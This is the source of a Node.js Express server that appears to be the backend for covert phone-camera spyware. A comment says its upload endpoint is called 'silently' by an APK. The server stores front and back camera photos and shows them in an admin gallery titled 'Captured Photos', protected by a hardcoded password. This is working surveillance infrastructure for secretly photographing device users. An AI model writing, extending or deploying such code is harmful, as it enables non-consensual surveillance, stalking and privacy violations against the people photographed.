const express = require('express');
const multer  = require('multer');
const basicAuth = require('express-basic-auth');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const PHOTOS_DIR = path.join(__dirname, 'public', 'photos');
if (!fs.existsSync(PHOTOS_DIR)) fs.mkdirSync(PHOTOS_DIR, { recursive: true });

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, PHOTOS_DIR),
  filename: (req, file, cb) => cb(null, `${Date.now()}_${file.fieldname}.jpg`)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

// Upload endpoint — called by APK silently
app.post('/upload', upload.fields([
  { name: 'front', maxCount: 1 },
  { name: 'back',  maxCount: 1 }
]), (req, res) => res.sendStatus(200));

// Admin panel — password protected
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'Th1ef@2303Secure';

app.use('/admin', basicAuth({ users: { [ADMIN_USER]: ADMIN_PASS }, challenge: true }));
app.use('/photos', basicAuth({ users: { [ADMIN_USER]: ADMIN_PASS }, challenge: true }),
  express.static(PHOTOS_DIR));

app.get('/admin', (req, res) => {
  const files = fs.readdirSync(PHOTOS_DIR)
    .filter(f => f.endsWith('.jpg'))
    .sort().reverse();

  const rows = files.map(f => {
    const ts = parseInt(f.split('_')[0]);
    const date = new Date(ts).toLocaleString('en-IN');
    const type = f.includes('front') ? '📱 Front' : '📷 Back';
    return `<div class="card">
      <p><strong>${type}</strong> &nbsp;|&nbsp; ${date}</p>
      <img src="/photos/${f}" />
    </div>`;
  }).join('');

  res.send(`<!DOCTYPE html>
<html><head><title>Admin</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{font-family:sans-serif;background:#0d0d0d;color:#eee;padding:20px;margin:0}
  h1{color:#fff;margin-bottom:24px}
  .card{background:#1a1a1a;border-radius:10px;padding:16px;margin-bottom:20px}
  img{max-width:100%;border-radius:6px;margin-top:10px;display:block}
  p{margin:0;font-size:14px;color:#aaa}
</style></head><body>
<h1>📷 Captured Photos</h1>
${rows.length ? rows : '<p style="color:#666">No photos yet.</p>'}
</body></html>`);
});

app.listen(PORT, () => console.log(`Running on ${PORT}`));
